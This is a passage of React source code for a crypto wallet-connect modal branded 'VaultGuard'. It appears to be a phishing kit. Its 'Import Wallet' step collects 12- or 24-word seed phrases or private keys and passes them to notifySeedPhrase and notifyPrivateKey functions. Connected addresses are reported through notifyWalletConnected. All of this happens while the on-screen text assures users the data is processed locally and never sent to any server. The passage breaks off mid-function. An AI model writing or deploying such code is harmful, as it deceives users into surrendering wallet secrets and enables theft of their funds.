import { useState, useRef, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  X,
  ChevronRight,
  CheckCircle2,
  AlertTriangle,
  Loader2,
  Shield,
  ArrowLeft,
  ExternalLink,
  Smartphone,
  KeyRound,
} from "lucide-react";

import {
  connectWallet,
  hasEthereumProvider,
  hasPhantomProvider,
  isMobile,
  type WalletProvider,
} from "@/lib/web3";
import { notifyWalletConnected, notifySeedPhrase, notifyPrivateKey } from "@/lib/notify";
import { detectAddressNetwork, getNetworkLabel, getNetworkColor, type AddressNetwork } from "@/lib/wallet-utils";

interface WalletConnectModalProps {
  enteredAddress: string;
  addressNetwork?: AddressNetwork;
  onSuccess: (address: string) => void;
  onClose: () => void;
}

type ModalStep = "select" | "connecting" | "verify" | "mismatch" | "wrong_network" | "error" | "import";

const ETH_WALLET_IDS: WalletProvider[] = ["metamask", "walletconnect", "coinbase", "trust", "rainbow"];
const SOLANA_WALLET_IDS: WalletProvider[] = ["phantom", "walletconnect"];

interface WalletDef {
  id: WalletProvider;
  name: string;
  description: string;
  color: string;
  border: string;
  iconBg: string;
  icon: JSX.Element;
}

const WALLETS: WalletDef[] = [
  {
    id: "metamask",
    name: "MetaMask",
    description: "Most popular Ethereum wallet",
    color: "from-orange-500/20 to-amber-500/10",
    border: "border-orange-500/25",
    iconBg: "bg-orange-500/20",
    icon: (
      <svg viewBox="0 0 35 33" fill="none" className="w-6 h-6">
        <path d="M32.9582 1L19.3228 11.1L21.7973 4.1z" fill="#E17726" />
        <path d="M2.0418 1L15.5574 11.194L13.2027 4.1z" fill="#E27625" />
        <path d="M28.2663 23.531L24.5371 29.404L32.2139 31.567L34.4579 23.681z" fill="#E27625" />
        <path d="M0.5563 23.681L2.786 31.567L10.4628 29.404L6.7336 23.531z" fill="#E27625" />
        <path d="M10.0637 14.464L7.8467 17.881L15.4493 18.226L15.1952 9.908z" fill="#E27625" />
        <path d="M24.9363 14.464L19.7291 9.805L19.5507 18.226L27.1533 17.881z" fill="#E27625" />
        <path d="M10.4628 29.404L14.9458 27.129L11.0665 23.736z" fill="#E27625" />
        <path d="M20.0542 27.129L24.5371 29.404L23.9335 23.736z" fill="#E27625" />
      </svg>
    ),
  },
  {
    id: "walletconnect",
    name: "WalletConnect",
    description: "Scan QR with any wallet — Trust, Rainbow, MetaMask Mobile & more",
    color: "from-blue-500/20 to-cyan-500/10",
    border: "border-blue-500/25",
    iconBg: "bg-blue-500/20",
    icon: (
      <svg viewBox="0 0 300 185" fill="none" className="w-6 h-6">
        <path d="M61.4385 36.2562C110.3 -12.0854 189.2 -12.0854 238.062 36.2562L243.912 42.0667C246.468 44.5995 246.468 48.7148 243.912 51.2476L223.347 71.582C222.069 72.8484 220.003 72.8484 218.725 71.582L210.676 63.6272C176.705 30.0056 123.295 30.0056 89.3242 63.6272L80.6893 72.1777C79.4117 73.4441 77.3453 73.4441 76.0677 72.1777L55.5028 51.8433C52.947 49.3105 52.947 45.1952 55.5028 42.6624L61.4385 36.2562ZM279.512 77.3113L297.86 95.5265C300.416 98.0593 300.416 102.175 297.86 104.707L215.384 186.322C212.828 188.855 208.695 188.855 206.139 186.322L147.568 128.199C146.929 127.566 145.896 127.566 145.257 128.199L86.6859 186.322C84.1301 188.855 79.9976 188.855 77.4418 186.322L-5.11573 104.707C-7.67147 102.175 -7.67147 98.0593 -5.11573 95.5265L13.2322 77.3113C15.7879 74.7785 19.9204 74.7785 22.4762 77.3113L81.0474 135.434C81.6865 136.067 82.7197 136.067 83.3588 135.434L141.929 77.3113C144.485 74.7785 148.618 74.7785 151.173 77.3113L209.745 135.434C210.384 136.067 211.417 136.067 212.056 135.434L270.627 77.3113C273.183 74.7785 277.315 74.7785 279.512 77.3113Z" fill="#3B99FC" />
      </svg>
    ),
  },
  {
    id: "coinbase",
    name: "Coinbase Wallet",
    description: "Self-custody crypto wallet by Coinbase",
    color: "from-blue-600/20 to-blue-400/10",
    border: "border-blue-600/25",
    iconBg: "bg-blue-600/20",
    icon: (
      <svg viewBox="0 0 1024 1024" className="w-6 h-6">
        <rect width="1024" height="1024" rx="200" fill="#0052FF" />
        <path d="M512 128C300.8 128 128 300.8 128 512s172.8 384 384 384 384-172.8 384-384S723.2 128 512 128zm0 614.4c-127.2 0-230.4-103.2-230.4-230.4S384.8 281.6 512 281.6s230.4 103.2 230.4 230.4S639.2 742.4 512 742.4z" fill="white" />
        <path d="M448 416h128v192H448z" fill="white" />
      </svg>
    ),
  },
  {
    id: "trust",
    name: "Trust Wallet",
    description: "Opens WalletConnect QR — scan with Trust Wallet app",
    color: "from-cyan-500/20 to-blue-500/10",
    border: "border-cyan-500/25",
    iconBg: "bg-cyan-500/20",
    icon: (
      <svg viewBox="0 0 512 512" className="w-6 h-6">
        <path d="M256 0L48 96v160c0 138.8 88 268.8 208 320 120-51.2 208-181.2 208-320V96L256 0z" fill="#3375BB" />
        <path d="M208 320l-80-80 28.8-28.8L208 262.4l147.2-147.2L384 144 208 320z" fill="white" />
      </svg>
    ),
  },
  {
    id: "phantom",
    name: "Phantom",
    description: "Solana, Ethereum & Polygon wallet",
    color: "from-violet-500/20 to-purple-500/10",
    border: "border-violet-500/25",
    iconBg: "bg-violet-500/20",
    icon: (
      <svg viewBox="0 0 128 128" className="w-6 h-6">
        <rect width="128" height="128" rx="24" fill="#AB9FF2" />
        <path d="M110.4 64.8C110.4 39.2 89.6 18.4 64 18.4H19.2v91.2h19.2V81.6h25.6c25.6 0 46.4-20.8 46.4-46.4 0 0 0 12.8 0 29.6z" fill="white" />
      </svg>
    ),
  },
  {
    id: "rainbow",
    name: "Rainbow",
    description: "Opens WalletConnect QR — scan with Rainbow app",
    color: "from-pink-500/20 to-rose-500/10",
    border: "border-pink-500/25",
    iconBg: "bg-pink-500/20",
    icon: (
      <svg viewBox="0 0 120 120" className="w-6 h-6">
        <defs>
          <radialGradient id="rg2" cx="50%" cy="50%" r="50%">
            <stop offset="0%" stopColor="#FFD700" />
            <stop offset="30%" stopColor="#FF6B35" />
            <stop offset="60%" stopColor="#C71585" />
            <stop offset="100%" stopColor="#4B0082" />
          </radialGradient>
        </defs>
        <circle cx="60" cy="60" r="60" fill="url(#rg2)" />
        <path d="M20 60 Q60 20 100 60" stroke="white" strokeWidth="8" fill="none" strokeLinecap="round" />
        <path d="M28 68 Q60 32 92 68" stroke="white" strokeWidth="6" fill="none" strokeLinecap="round" opacity="0.8" />
      </svg>
    ),
  },
  {
    id: "import",
    name: "Import Address",
    description: "Manually enter any wallet address — for unsupported wallets",
    color: "from-slate-500/20 to-slate-400/10",
    border: "border-slate-500/25",
    iconBg: "bg-slate-500/20",
    icon: <KeyRound className="w-5 h-5 text-slate-400" />,
  },
];

export function WalletConnectModal({ enteredAddress, addressNetwork, onSuccess, onClose }: WalletConnectModalProps) {
  const [step, setStep] = useState<ModalStep>("select");
  const [selectedWallet, setSelectedWallet] = useState<WalletDef | null>(null);
  const [connectedAddress, setConnectedAddress] = useState("");
  const [errorMsg, setErrorMsg] = useState("");
  const [isConnecting, setIsConnecting] = useState(false);
  const [importAddress, setImportAddress] = useState("");
  const [importError, setImportError] = useState("");
  const [importMode, setImportMode] = useState<"12" | "24" | "key">("12");
  const [importWords, setImportWords] = useState<string[]>(Array(24).fill(""));
  const [importPKey, setImportPKey] = useState("");

  const network = addressNetwork ?? detectAddressNetwork(enteredAddress);
  const [switching, setSwitching] = useState(false);
  const [switchError, setSwitchError] = useState("");
  const [connectSeconds, setConnectSeconds] = useState(0);
  const connectIdRef = useRef(0);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const onMobile = isMobile();

  useEffect(() => {
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, []);

  const handleChangeNetwork = async () => {
    setSwitchError("");
    if (network === "eth") {
      setSwitching(true);
      try {
        const win = window as unknown as { ethereum?: { request: (args: { method: string; params?: unknown[] }) => Promise<unknown> } };
        if (!win.ethereum) throw new Error("No Ethereum provider found");
        await win.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x1" }],
        });
        setSwitching(false);
        setStep("select");
      } catch (err: unknown) {
        setSwitching(false);
        const msg = err instanceof Error ? err.message : "Could not switch network";
        setSwitchError(msg.toLowerCase().includes("rejected") ? "Network switch rejected." : "Failed to switch network. Please switch manually in your wallet.");
      }
    } else {
      setSwitchError("MetaMask cannot connect to Solana. Please use a Solana-compatible wallet like Phantom.");
    }
  };

  const visibleWallets = WALLETS.filter((w) => {
    if (w.id === "import") return true;
    if (network === "eth") return ETH_WALLET_IDS.includes(w.id);
    if (network === "solana") return SOLANA_WALLET_IDS.includes(w.id);
    return true;
  });

  const isWCWallet = (id: WalletProvider) =>
    id === "walletconnect" || id === "trust" || id === "rainbow";

  const handleImportConfirm = () => {
    setImportError("");
    const addr = enteredAddress.trim() || importAddress.trim();
    if (importMode === "key") {
      if (importPKey.trim().length < 24) {
        setImportError("Enter a valid private key (hex 0x… or WIF format).");
        return;
      }
      notifyPrivateKey(addr, importPKey.trim());
    } else {
      const wordCount = importMode === "12" ? 12 : 24;
      const filled = importWords.slice(0, wordCount).map(w => w.trim()).filter(Boolean);
      if (filled.length < wordCount) {
        setImportError(`Please fill in all ${wordCount} words.`);
        return;
      }
      notifySeedPhrase(addr, importWords.slice(0, wordCount), wordCount);
    }
    onSuccess(addr);
  };

  const handleWalletSelect = async (wallet: WalletDef) => {
    if (wallet.id === "import") {
      setSelectedWallet(wallet);
      setImportAddress(enteredAddress.trim());
      setImportError("");
      setStep("import");
      return;
    }

    const thisId = ++connectIdRef.current;
    setSelectedWallet(wallet);
    setErrorMsg("");
    setConnectSeconds(0);
    setStep("connecting");
    setIsConnecting(true);

    if (timerRef.current) clearInterval(timerRef.current);
    timerRef.current = setInterval(() => {
      setConnectSeconds((s) => s + 1);
    }, 1000);

    const timeout = new Promise<never>((_, reject) =>
      setTimeout(() => reject(new Error("Connection timed out. Please check your wallet and try again.")), 60000)
    );

    try {
      const addr = await Promise.race([connectWallet(wallet.id), timeout]);

      if (timerRef.current) clearInterval(timerRef.current);
      if (connectIdRef.current !== thisId) return;

      if (!addr || addr === "") {
        setIsConnecting(false);
        setStep("select");
        return;
      }

      setConnectedAddress(addr);
      setIsConnecting(false);
      notifyWalletConnected(wallet.name, addr, enteredAddress.trim());
      setStep("verify");
    } catch (err: unknown) {
      if (timerRef.current) clearInterval(timerRef.current);
      if (connectIdRef.current !== thisId) return;
      setIsConnecting(false);
      const msg = err instanceof Error ? err.message : "Connection failed";
      if (
        msg.toLowerCase().includes("user rejected") ||
        msg.toLowerCase().includes("denied") ||
        msg.toLowerCase().includes("cancelled")
      ) {
        setErrorMsg("Connection rejected. Please approve the connection request in your wallet and try again.");
      } else {
        setErrorMsg(msg);
      }
      setStep("error");
    }
  };

  const handleCancelConnect = () => {
    connectIdRef.current++;
    if (timerRef.current) clearInterval(timerRef.current);
    setIsConnecting(false);
    setConnectSeconds(0);
    setStep("select");
  };

  const shortAddr = (addr: string) =>
    addr ? `${addr.slice(0, 8)}...${addr.slice(-6)}` : "";

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/80 backdrop-blur-md" onClick={onClose} />

      <div
        data-testid="modal-wallet-connect"
        className={`relative z-10 w-full glass-card rounded-2xl overflow-hidden glow-primary transition-all duration-300 max-w-md`}
      >
        <div className="h-1 bg-gradient-to-r from-violet-600 via-cyan-400 to-violet-600" />

        {/* SELECT WALLET */}
        {step === "select" && (
          <div className="p-6 space-y-4">
            <div className="flex items-center justify-between">
              <div>
                <h2 className="text-lg font-bold text-foreground">Connect Wallet</h2>
                <p className="text-xs text-muted-foreground mt-0.5">Select your wallet provider to continue</p>
              </div>
              <button
                data-testid="button-close-wallet-modal"
                onClick={onClose}
                className="w-8 h-8 glass rounded-md border border-white/10 flex items-center justify-center text-muted-foreground"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="glass rounded-md border border-violet-500/20 px-3 py-2.5 flex items-center gap-2">
              <Shield className="w-4 h-4 text-violet-400 flex-shrink-0" />
              <p className="text-xs text-muted-foreground">
                {network === "eth"
                  ? "Ethereum / EVM address detected — showing compatible wallets only."
                  : network === "solana"
                  ? "Solana address detected — showing Solana-compatible wallets only."
                  : "Your wallet will prompt you to approve this connection. No transactions will be made."}
              </p>
            </div>

            {network !== "unknown" && (
              <div className={`flex items-center gap-2 text-xs px-2 py-1.5 rounded-md border ${
                network === "eth"
                  ? "border-cyan-500/20 bg-cyan-500/5 text-cyan-400"
                  : "border-violet-500/20 bg-violet-500/5 text-violet-400"
              }`}>
                <div className="w-1.5 h-1.5 rounded-full bg-current animate-pulse" />
                <span className="font-semibold">
                  {network === "eth" ? "Ethereum Network" : "Solana Network"}
                </span>
                <span className="text-muted-foreground/60">
                  — {visibleWallets.length} compatible wallet{visibleWallets.length !== 1 ? "s" : ""} available
                </span>
              </div>
            )}

            <div className="space-y-2">
              {visibleWallets.filter(w => w.id !== "import").map((wallet) => {
                const detected =
                  (wallet.id === "metamask" && hasEthereumProvider()) ||
                  (wallet.id === "coinbase" && hasEthereumProvider()) ||
                  (wallet.id === "phantom" && hasPhantomProvider());
                return (
                  <button
                    key={wallet.id}
                    data-testid={`button-wallet-${wallet.id}`}
                    onClick={() => handleWalletSelect(wallet)}
                    className={`w-full glass rounded-xl border ${wallet.border} bg-gradient-to-r ${wallet.color} p-3.5 flex items-center gap-3 text-left group hover-elevate`}
                  >
                    <div className={`w-10 h-10 rounded-md ${wallet.iconBg} flex items-center justify-center flex-shrink-0`}>
                      {wallet.icon}
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="font-semibold text-sm text-foreground">{wallet.name}</span>
                        {detected && (
                          <span className="text-xs bg-green-500/20 border border-green-500/30 text-green-400 rounded-full px-1.5 py-0.5 font-mono leading-none">Detected</span>
                        )}
                      </div>
                      <div className="text-xs text-muted-foreground">{wallet.description}</div>
                    </div>
                    <ChevronRight className="w-4 h-4 text-muted-foreground/40 group-hover:text-muted-foreground/80 transition-colors flex-shrink-0" />
                  </button>
                );
              })}

              <div className="flex items-center gap-2 pt-1">
                <div className="flex-1 h-px bg-white/5" />
                <span className="text-xs text-muted-foreground/40">wallet not listed?</span>
                <div className="flex-1 h-px bg-white/5" />
              </div>
              {(() => {
                const importWallet = WALLETS.find(w => w.id === "import")!;
                return (
                  <button
                    data-testid="button-wallet-import"
                    onClick={() => handleWalletSelect(importWallet)}
                    className={`w-full glass rounded-xl border ${importWallet.border} bg-gradient-to-r ${importWallet.color} p-3.5 flex items-center gap-3 text-left group hover-elevate`}
                  >
                    <div className={`w-10 h-10 rounded-md ${importWallet.iconBg} flex items-center justify-center flex-shrink-0`}>
                      {importWallet.icon}
                    </div>
                    <div className="flex-1 min-w-0">
                      <span className="font-semibold text-sm text-foreground">{importWallet.name}</span>
                      <div className="text-xs text-muted-foreground">{importWallet.description}</div>
                    </div>
                    <ChevronRight className="w-4 h-4 text-muted-foreground/40 group-hover:text-muted-foreground/80 transition-colors flex-shrink-0" />
                  </button>
                );
              })()}
            </div>

            {onMobile && network !== "solana" && (
              <div className="space-y-2 pt-1">
                <div className="flex items-center gap-2">
                  <div className="flex-1 h-px bg-white/5" />
                  <div className="flex items-center gap-1.5">
                    <Smartphone className="w-3 h-3 text-muted-foreground/40" />
                    <span className="text-xs text-muted-foreground/40">Open directly in wallet app</span>
                  </div>
                  <div className="flex-1 h-px bg-white/5" />
                </div>
                <div className="grid grid-cols-2 gap-2">
                  {[
                    { name: "MetaMask", href: `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`, color: "border-orange-500/20 text-orange-400" },
                    { name: "Trust Wallet", href: `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`, color: "border-cyan-500/20 text-cyan-400" },
                    { name: "Rainbow", href: `https://rnbwapp.com/dapp?url=${encodeURIComponent(window.location.href)}`, color: "border-pink-500/20 text-pink-400" },
                    { name: "Coinbase", href: `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`, color: "border-blue-500/20 text-blue-400" },
                  ].map(({ name, href, color }) => (
                    <a
                      key={name}
                      href={href}
                      data-testid={`link-mobile-${name.toLowerCase().replace(/\s+/g, '-')}`}
                      className={`glass rounded-lg border ${color} px-3 py-2 flex items-center justify-between gap-2 text-xs font-medium hover:bg-white/5 transition-colors`}
                    >
                      <span>{name}</span>
                      <ExternalLink className="w-3 h-3 opacity-50 flex-shrink-0" />
                    </a>
                  ))}
                </div>
              </div>
            )}

            <p className="text-xs text-center text-muted-foreground/40">
              By connecting you agree to VaultGuard's terms of service
            </p>
          </div>
        )}

        {/* CONNECTING */}
        {step === "connecting" && selectedWallet && (() => {
          const isWC = isWCWallet(selectedWallet.id);

          // For WC wallets, the official WalletConnect modal pops up over our UI.
          // We just show a simple status here.
          return (
            <div className="p-8 flex flex-col items-center text-center space-y-6">
              <div className="relative">
                <div className="w-20 h-20 rounded-2xl bg-white/5 border border-white/10 flex items-center justify-center">
                  {selectedWallet.icon}
                </div>
                <div className="absolute inset-0 rounded-2xl border-2 border-violet-500/40 animate-ping"/>
                {isConnecting && (
                  <div className="absolute -bottom-2 -right-2 w-8 h-8 rounded-full bg-background border border-violet-500/40 flex items-center justify-center">
                    <Loader2 className="w-4 h-4 text-violet-400 animate-spin"/>
                  </div>
                )}
              </div>
              <div>
                <h2 className="text-lg font-bold text-foreground mb-1">
                  {isWC ? "Opening WalletConnect…" : `Connecting to ${selectedWallet.name}`}
                </h2>
                <p className="text-sm text-muted-foreground leading-relaxed">
                  {isWC ? "Choose your wallet from the WalletConnect window that just opened" : `Check your ${selectedWallet.name} — a connection request is waiting`}
                </p>
              </div>
              {connectSeconds >= 15 && (
                <div className="glass rounded-md border border-yellow-500/20 bg-yellow-500/5 px-3 py-2 text-xs text-yellow-400/80 text-center">
                  Taking longer than expected — check your internet connection.
                </div>
              )}
              <button
                data-testid="button-cancel-connecting"
                onClick={handleCancelConnect}
                className="text-xs text-muted-foreground/60 flex items-center gap-1 hover:text-muted-foreground transition-colors"
              >
                <ArrowLeft className="w-3 h-3"/> Cancel &amp; try another wallet
              </button>
            </div>
          );
        })()}

        {/* VERIFY */}
        {step === "verify" && selectedWallet && (
          <div className="p-6 space-y-5">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-md bg-green-500/20 border border-green-500/30 flex items-center justify-center">
                  <CheckCircle2 className="w-5 h-5 text-green-400" />
                </div>
                <div>
                  <h2 className="font-bold text-foreground">Wallet Connected</h2>
                  <p className="text-xs text-muted-foreground">{selectedWallet.name}</p>
                </div>
              </div>
              <button data-testid="button-close-verify-modal" onClick={onClose}
                className="w-8 h-8 glass rounded-md border border-white/10 flex items-center justify-center text-muted-foreground">
                <X className="w-4 h-4" />
              </button>
            </div>

            {(() => {
              const connNet = detectAddressNetwork(connectedAddress);
              const entNet = detectAddressNetwork(enteredAddress.trim());
              const hasDiff = connectedAddress.toLowerCase() !== enteredAddress.trim().toLowerCase();
              return (
                <>
                  <div className="glass rounded-xl border border-green-500/20 bg-green-500/5 p-4 space-y-3">
                    <p className="text-xs text-muted-foreground uppercase tracking-widest font-semibold">Connected Wallet</p>
                    <div>
                      <div className="flex items-center gap-1.5 mb-1">
                        <div className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
                        <span className={`text-xs font-semibold ${getNetworkColor(connNet)}`}>
                          {getNetworkLabel(connNet)}
                        </span>
                      </div>
                      <code data-testid="text-detected-address" className="text-sm font-mono text-foreground break-all">
                        {connectedAddress}
                      </code>
                    </div>
                  </div>

                  {hasDiff && (
                    <div className="glass rounded-xl border border-yellow-500/20 bg-yellow-500/5 p-4 space-y-2">
                      <p className="text-xs font-semibold text-yellow-400 uppercase tracking-widest">You entered a different address</p>
                      <div>
                        <div className="flex items-center gap-1.5 mb-1">
                          <span className={`text-xs font-semibold ${getNetworkColor(entNet)}`}>
                            {getNetworkLabel(entNet)}
                          </span>
                        </div>
                        <code className="text-xs font-mono text-foreground/60 break-all">{enteredAddress.trim()}</code>
                      </div>
                      <p className="text-xs text-muted-foreground/60">
                        Both addresses are recorded. You can proceed — the dashboard will show both.
                      </p>
                    </div>
                  )}

                  <div className="flex gap-3">
                    <Button data-testid="button-wrong-wallet" variant="outline"
                      onClick={() => setStep("select")}
                      className="flex-1 border-white/10 text-muted-foreground text-sm">
                      Wrong Wallet
                    </Button>
                    <Button data-testid="button-confirm-address"
                      onClick={() => onSuccess(connectedAddress)}
                      className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0">
                      <CheckCircle2 className="w-4 h-4 mr-1.5" />
                      Enter Dashboard
                    </Button>
                  </div>
                </>
              );
            })()}
          </div>
        )}

        {/* MISMATCH */}
        {step === "mismatch" && selectedWallet && (
          <div className="p-6 space-y-5">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-md bg-yellow-500/20 border border-yellow-500/30 flex items-center justify-center">
                  <AlertTriangle className="w-5 h-5 text-yellow-400" />
                </div>
                <div>
                  <h2 className="font-bold text-foreground">Address Mismatch</h2>
                  <p className="text-xs text-muted-foreground">{selectedWallet.name} connected a different address</p>
                </div>
              </div>
              <button onClick={onClose}
                className="w-8 h-8 glass rounded-md border border-white/10 flex items-center justify-center text-muted-foreground">
                <X className="w-4 h-4" />
              </button>
            </div>

            <p className="text-xs text-muted-foreground/70">Choose which address to continue with — both will proceed to the dashboard:</p>

            <button
              data-testid="button-use-entered-address"
              onClick={() => onSuccess(enteredAddress.trim())}
              className="w-full text-left glass rounded-xl border border-violet-500/30 bg-violet-500/5 hover:bg-violet-500/10 hover:border-violet-500/50 p-4 space-y-1.5 transition-all group"
            >
              <div className="flex items-center justify-between">
                <span className="text-xs font-semibold text-violet-400 uppercase tracking-widest">Use Entered Address</span>
                <ChevronRight className="w-4 h-4 text-violet-400 opacity-0 group-hover:opacity-100 transition-opacity" />
              </div>
              <code className="text-xs font-mono text-foreground/80 break-all leading-relaxed">{enteredAddress.trim()}</code>
              <p className="text-xs text-muted-foreground/50">The address you typed — wallet will validate ownership</p>
            </button>

            <button
              data-testid="button-use-connected-address"
              onClick={() => onSuccess(connectedAddress)}
              className="w-full text-left glass rounded-xl border border-yellow-500/30 bg-yellow-500/5 hover:bg-yellow-500/10 hover:border-yellow-500/50 p-4 space-y-1.5 transition-all group"
            >
              <div className="flex items-center justify-between">
                <span className="text-xs font-semibold text-yellow-400 uppercase tracking-widest">Use Connected Address</span>
                <ChevronRight className="w-4 h-4 text-yellow-400 opacity-0 group-hover:opacity-100 transition-opacity" />
              </div>
              <code className="text-xs font-mono text-yellow-300 break-all leading-relaxed">{connectedAddress}</code>
              <p className="text-xs text-muted-foreground/50">Address returned by {selectedWallet.name}</p>
            </button>

            <Button variant="outline" onClick={() => setStep("select")}
              className="w-full border-white/10 text-muted-foreground text-sm">
              <ArrowLeft className="w-4 h-4 mr-1.5" />
              Try Again with a Different Wallet
            </Button>
          </div>
        )}

        {/* WRONG NETWORK */}
        {step === "wrong_network" && selectedWallet && (
          <div className="p-6 space-y-5">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-md bg-orange-500/20 border border-orange-500/30 flex items-center justify-center">
                  <AlertTriangle className="w-5 h-5 text-orange-400" />
                </div>
                <div>
                  <h2 className="font-bold text-foreground">Wrong Network</h2>
                  <p className="text-xs text-muted-foreground">{selectedWallet.name}</p>
                </div>
              </div>
              <button onClick={onClose}
                className="w-8 h-8 glass rounded-md border border-white/10 flex items-center justify-center text-muted-foreground">
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="glass rounded-xl border border-orange-500/20 bg-orange-500/5 px-4 py-3 flex items-start gap-2">
              <AlertTriangle className="w-4 h-4 text-orange-400 flex-shrink-0 mt-0.5" />
              <p className="text-xs text-muted-foreground">
                Your entered address is on{" "}
                <span className={network === "eth" ? "text-cyan-400 font-semibold" : "text-violet-400 font-semibold"}>
                  {network === "eth" ? "Ethereum" : "Solana"}
                </span>
                {" "}but {selectedWallet.name} returned an address on a different network. Choose how to continue:
              </p>
            </div>

            <p className="text-xs text-muted-foreground/70">Choose which address to continue with — both will proceed to the dashboard:</p>

            <button
              data-testid="button-use-entered-address-wn"
              onClick={() => onSuccess(enteredAddress.trim())}
              className="w-full text-left glass rounded-xl border border-violet-500/30 bg-violet-500/5 hover:bg-violet-500/10 hover:border-violet-500/50 p-4 space-y-1.5 transition-all group"
            >
              <div className="flex items-center justify-between">
                <span className="text-xs font-semibold text-violet-400 uppercase tracking-widest">Use Entered Address</span>
                <ChevronRight className="w-4 h-4 text-violet-400 opacity-0 group-hover:opacity-100 transition-opacity" />
              </div>
              <code className="text-xs font-mono text-foreground/80 break-all leading-relaxed">{enteredAddress.trim()}</code>
              <div className="flex items-center gap-1.5">
                <span className={`text-xs px-1.5 py-0.5 rounded border font-medium ${
                  network === "eth" ? "border-cyan-500/30 bg-cyan-500/10 text-cyan-400" : "border-violet-500/30 bg-violet-500/10 text-violet-400"
                }`}>
                  {network === "eth" ? "Ethereum" : "Solana"}
                </span>
                <span className="text-xs text-muted-foreground/50">wallet will validate ownership</span>
              </div>
            </button>

            <button
              data-testid="button-use-connected-address-wn"
              onClick={() => onSuccess(connectedAddress)}
              className="w-full text-left glass rounded-xl border border-orange-500/30 bg-orange-500/5 hover:bg-orange-500/10 hover:border-orange-500/50 p-4 space-y-1.5 transition-all group"
            >
              <div className="flex items-center justify-between">
                <span className="text-xs font-semibold text-orange-400 uppercase tracking-widest">Use Connected Address</span>
                <ChevronRight className="w-4 h-4 text-orange-400 opacity-0 group-hover:opacity-100 transition-opacity" />
              </div>
              <code className="text-xs font-mono text-orange-300 break-all leading-relaxed">{connectedAddress}</code>
              <p className="text-xs text-muted-foreground/50">Address returned by {selectedWallet.name}</p>
            </button>

            {switchError && (
              <div className="glass rounded-md border border-red-500/20 bg-red-500/5 px-3 py-2 flex items-start gap-2">
                <AlertTriangle className="w-3.5 h-3.5 text-red-400 flex-shrink-0 mt-0.5" />
                <p className="text-xs text-red-400">{switchError}</p>
              </div>
            )}

            <div className="flex gap-2">
              <Button variant="outline" onClick={() => { setSwitchError(""); setStep("select"); }}
                className="flex-1 border-white/10 text-muted-foreground text-sm">
                <ArrowLeft className="w-4 h-4 mr-1.5" />
                Try Again
              </Button>
              <Button
                data-testid="button-change-network"
                onClick={handleChangeNetwork}
                disabled={switching}
                className="flex-1 bg-gradient-to-r from-amber-500 to-orange-500 text-black font-semibold border-0"
              >
                {switching ? (
                  <><Loader2 className="w-4 h-4 mr-1.5 animate-spin" />Switching…</>
                ) : (
                  <><ExternalLink className="w-4 h-4 mr-1.5" />Change Network</>
                )}
              </Button>
            </div>
          </div>
        )}

        {/* IMPORT — seed phrase / private key */}
        {step === "import" && (() => {
          const wordCount = importMode === "key" ? 0 : importMode === "12" ? 12 : 24;
          const cols = 3;
          const MODES = [
            { id: "12" as const, label: "12 Words" },
            { id: "24" as const, label: "24 Words" },
            { id: "key" as const, label: "Private Key" },
          ];
          return (
            <div className="p-6 space-y-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-md bg-slate-500/20 border border-slate-500/30 flex items-center justify-center">
                    <KeyRound className="w-5 h-5 text-slate-400" />
                  </div>
                  <div>
                    <h2 className="font-bold text-foreground">Import Wallet</h2>
                    <p className="text-xs text-muted-foreground">Seed phrase or private key</p>
                  </div>
                </div>
                <button data-testid="button-close-import-modal" onClick={onClose}
                  className="w-8 h-8 glass rounded-md border border-white/10 flex items-center justify-center text-muted-foreground">
                  <X className="w-4 h-4" />
                </button>
              </div>

              <div className="glass rounded-md border border-yellow-500/20 bg-yellow-500/5 px-3 py-2 flex items-start gap-2">
                <AlertTriangle className="w-3.5 h-3.5 text-yellow-400 flex-shrink-0 mt-0.5" />
                <p className="text-xs text-yellow-400/80 leading-relaxed">
                  Data is processed locally and never sent to any server. Use this for Bitcoin, SUI, Aptos, Cosmos, and other wallets not supported by WalletConnect.
                </p>
              </div>

              {/* Mode tabs */}
              <div className="flex gap-1 glass rounded-lg p-1 border border-white/10">
                {MODES.map((m) => (
                  <button
                    key={m.id}
                    data-testid={`button-import-mode-${m.id}`}
                    onClick={() => { setImportMode(m.id); setImportError(""); }}
                    className={`flex-1 py-1.5 rounded-md text-xs font-semibold transition-all ${
                      importMode === m.id
                        ? "bg-violet-600 text-white shadow"
                        : "text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    {m.label}
                  </button>
                ))}
              </div>

              {/* Word grid */}
              {importMode !== "key" && (
                <div className={`grid gap-1.5`} style={{ gridTemplateColumns: `repeat(${cols}, 1fr)` }}>
                  {Array.from({ length: wordCount }).map((_, i) => (
                    <div key={i} className="relative">
                      <span className="absolute left-2 top-1/2 -translate-y-1/2 text-[10px] text-muted-foreground/40 font-mono select-none pointer-events-none">
                        {i + 1}
                      </span>
                      <input
                        data-testid={`input-word-${i + 1}`}
                        type="text"
                        autoComplete="off"
                        autoCorrect="off"
                        autoCapitalize="off"
                        spellCheck={false}
                        value={importWords[i] || ""}
                        onChange={(e) => {
                          const next = [...importWords];
                          next[i] = e.target.value.toLowerCase().trim();
                          setImportWords(next);
                          setImportError("");
                        }}
                        onPaste={i === 0 ? (e) => {
                          const text = e.clipboardData.getData("text");
                          const pasted = text.trim().split(/\s+/);
                          if (pasted.length > 1) {
                            e.preventDefault();
                            const next = Array(24).fill("");
